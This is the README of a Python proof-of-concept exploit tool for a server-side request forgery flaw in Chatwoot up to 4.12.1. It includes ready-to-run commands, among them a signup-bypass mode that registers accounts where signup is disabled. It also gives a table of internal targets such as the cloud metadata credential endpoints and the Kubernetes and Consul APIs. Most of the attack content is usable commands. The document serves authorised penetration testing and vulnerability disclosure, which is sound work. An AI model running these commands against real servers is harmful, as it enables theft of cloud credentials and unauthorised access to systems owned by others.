# chatwoot_exploit.py

PoC tool for the SSRF vulnerability in Chatwoot <= 4.12.1.

Triggers a server-side request forgery (SSRF) via `POST /api/v1/accounts/:id/upload`
using the `external_url` parameter. The server fetches the given URL and stores the
response in ActiveStorage, which can then be read back.

Fixed in Chatwoot v4.13.0 (ssrf_filter gem).

---

## Requirements

- Python 3.8+
- No third-party dependencies

---

## Usage

```
python chatwoot_exploit.py --target <URL> [auth options] --ssrf-url <internal URL>
```

### Authentication modes

**Mode 1: login with credentials**
```
python chatwoot_exploit.py \
  --target http://chatwoot.example.com \
  --email admin@example.com \
  --password Secret123 \
  --ssrf-url http://169.254.169.254/latest/meta-data/
```

**Mode 2: existing API token**
```
python chatwoot_exploit.py \
  --target http://chatwoot.example.com \
  --token YOUR_API_ACCESS_TOKEN \
  --account-id 1 \
  --ssrf-url http://169.254.169.254/latest/meta-data/
```

**Mode 3: signup bypass (Chatwoot <= 4.11.2)**

Registers a new account even when signup is disabled (missing `check_signup_enabled`
on `POST /api/v1/accounts`). Credentials are saved to `woot_session.txt` so the
same account is reused on subsequent runs.

```
python chatwoot_exploit.py \
  --target http://chatwoot.example.com \
  --signup-bypass \
  --ssrf-url http://169.254.169.254/latest/meta-data/
```

With custom credentials:
```
python chatwoot_exploit.py \
  --target http://chatwoot.example.com \
  --signup-bypass \
  --signup-email attacker@evil.com \
  --signup-password Attacker123! \
  --signup-name "Test" \
  --ssrf-url http://169.254.169.254/latest/meta-data/
```

---

## Version check

Prints the Chatwoot version and applicable vulnerability tags without attempting any exploit.

```
python chatwoot_exploit.py --target http://chatwoot.example.com --get-version
```

---

## Proxy support

```
python chatwoot_exploit.py \
  --target http://chatwoot.example.com \
  --email admin@example.com \
  --password Secret123 \
  --proxy http://127.0.0.1:8080 \
  --no-ssl-verify \
  --ssrf-url http://169.254.169.254/latest/meta-data/
```

---

## All options

| Option | Description |
|---|---|
| `--target` | Chatwoot base URL (e.g. `https://app.chatwoot.com`) |
| `--get-version` | Print version and vulnerability tags, then exit |
| `--email` | Login email |
| `--password` | Login password |
| `--token` | Existing API access token |
| `--account-id` | Account ID (required with `--token`) |
| `--signup-bypass` | Create a new account (Chatwoot <= 4.11.2) |
| `--signup-email` | Email for new account (random if not set) |
| `--signup-password` | Password for new account (random if not set) |
| `--signup-name` | Account name (random if not set) |
| `--force` | Skip version check in signup bypass mode |
| `--ssrf-url` | Internal URL for the server to fetch |
| `--proxy` | HTTP proxy URL |
| `--no-ssl-verify` | Disable SSL certificate verification |
| `--clear-session` | Delete `woot_session.txt` and exit |
| `--demo-targets` | Print common SSRF target URLs and exit |

---

## Session file

When `--signup-bypass` is used, credentials and token are saved to `woot_session.txt`
keyed by target URL. The same account is reused on the next run instead of creating
a new one. To reset:

```
python chatwoot_exploit.py --target http://chatwoot.example.com --clear-session
```

Format:
```json
{
  "http://chatwoot.example.com": {
    "token": "...",
    "account_id": 3,
    "email": "abc123@pwned.local",
    "password": "Rj4mKpL!@"
  }
}
```

---

## Common SSRF targets

```
python chatwoot_exploit.py --demo-targets
```

| Target | URL |
|---|---|
| AWS IMDSv1 credentials | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| AWS IMDSv1 hostname | `http://169.254.169.254/latest/meta-data/hostname` |
| GCP metadata | `http://metadata.google.internal/computeMetadata/v1/?recursive=true` |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| Kubernetes API | `https://kubernetes.default.svc/api` |
| Consul | `http://127.0.0.1:8500/v1/agent/self` |

---

## Disclaimer

This tool is intended for authorized security testing, penetration testing
engagements, and research on systems you own or have explicit written permission
to test.

Using this tool against systems without authorization is illegal and may violate
computer crime laws including but not limited to the Computer Fraud and Abuse Act
(CFAA), the UK Computer Misuse Act, and equivalent laws in other jurisdictions.

The authors are not responsible for any misuse or damage caused by this tool.
By using it, you confirm that you have the legal right to test the target system.
